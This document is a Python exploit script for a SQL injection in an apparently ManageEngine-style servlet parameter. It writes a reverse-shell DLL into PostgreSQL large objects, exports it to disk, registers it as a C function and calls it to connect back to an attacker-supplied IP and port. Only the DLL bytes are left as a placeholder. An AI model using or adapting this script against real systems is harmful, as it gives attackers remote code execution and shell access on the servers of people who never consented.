import requests, sys, urllib, string, random, time
requests.packages.urllib3.disable_warnings()

# encoded UDF rev_shell dll
udf = '<Insert Hex Here>'
loid = 1339

def log(msg):
    print(msg)

def make_request(url, sql):
    log(f"[*] Executing query: {sql}")
    r = requests.get(url % sql, verify=False)
    return r

def delete_lo(url, loid):
    log("[+] Deleting existing LO…")
    sql = f"SELECT lo_unlink({loid})"
    make_request(url, sql)

def create_lo(url, loid):
    log("[+] Creating LO for UDF injection…")
    sql = f"SELECT lo_import($$C:\\windows\\win.ini$$,{loid})"
    make_request(url, sql)

def inject_udf(url, loid):
    log(f"[+] Injecting payload of length {len(udf)} into LO…")
    # split udf into 4096‑byte chunks
    total_chunks = (len(udf) - 1) // 4096 + 1
    for i in range(total_chunks):
        udf_chunk = udf[i*4096:(i+1)*4096]
        if i == 0:
            sql = (
                f"UPDATE PG_LARGEOBJECT "
                f"SET data = decode($${udf_chunk}$$, $$hex$$) "
                f"WHERE loid = {loid} AND pageno = {i}"
            )
        else:
            sql = (
                f"INSERT INTO PG_LARGEOBJECT (loid, pageno, data) "
                f"VALUES ({loid}, {i}, decode($${udf_chunk}$$, $$hex$$))"
            )
        make_request(url, sql)

def export_udf(url, loid):
    log("[+] Exporting UDF library to filesystem…")
    sql = f"SELECT lo_export({loid}, $$C:\\Users\\Public\\rev_shell.dll$$)"
    make_request(url, sql)

def create_udf_func(url):
    log("[+] Creating function…")
    sql = (
        "CREATE OR REPLACE FUNCTION rev_shell(text, integer) "
        "RETURNS VOID AS $$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$ "
        "LANGUAGE C STRICT"
    )
    make_request(url, sql)

def trigger_udf(url, ip, port):
    log("[+] Launching reverse shell…")
    sql = f"SELECT rev_shell($${ip}$$, {int(port)})"
    make_request(url, sql)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"[-] Usage: {sys.argv[0]} serverIP:port attackerIP port")
        sys.exit(1)

    server, attacker, port = (arg.strip() for arg in sys.argv[1:4])
    sqli_url = (
        f"https://{server}/servlet/AMUserResourcesSyncServlet?"
        f"ForMasRange=1&userId=1;%s;--"
    )

    delete_lo(sqli_url, loid)
    create_lo(sqli_url, loid)
    inject_udf(sqli_url, loid)
    export_udf(sqli_url, loid)
    create_udf_func(sqli_url)
    trigger_udf(sqli_url, attacker, port)
